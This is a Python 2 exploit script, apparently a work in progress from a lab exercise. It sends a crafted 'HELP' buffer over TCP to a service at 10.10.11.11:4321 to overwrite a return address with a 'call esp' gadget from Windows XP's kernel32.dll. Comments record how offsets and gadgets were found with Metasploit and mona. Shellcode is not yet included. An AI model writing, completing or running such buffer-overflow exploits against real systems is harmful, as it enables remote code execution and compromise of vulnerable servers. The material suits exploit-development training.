#!/usr/bin/python

import socket
import os
import sys
import time
host = "10.10.11.11"
port = 4321

#  0x76558c20 (b+0x00048c20)  : jmp esp |  {PAGE_EXECUTE_READ} 
#root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 1005
buffer = 'HELP '
buffer += 'A' * 7
#buffer += 'CCCC'
#the cccc is what you replace with the address
#buffer += 'CCCC'

#0x77e766e2 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] AS
#output of !mona jmp -r esp
#0x7c836a78
#Log data, item 10
# Address=7C82385D
 #Message=  0x7c82385d : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.2180 (C:\WINDOWS\system32\kernel32.dll)

buffer += '\x5D\x38\x82\x7C'
buffer += '('
buffer += "B" * 44
# ABCDEFGHIJK(((((((((('
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
#print s.recv(1024)
time.sleep(1)
#s.send("HELP ")
#time.sleep(1)
#print s.recv(1024)
#buffer = "HELP " + buffer
s.send(buffer)
#print s.recv(1024)
time.sleep(1)
#s.send("HELP" + buffer)
#print s.recv(1024)
#s.close()
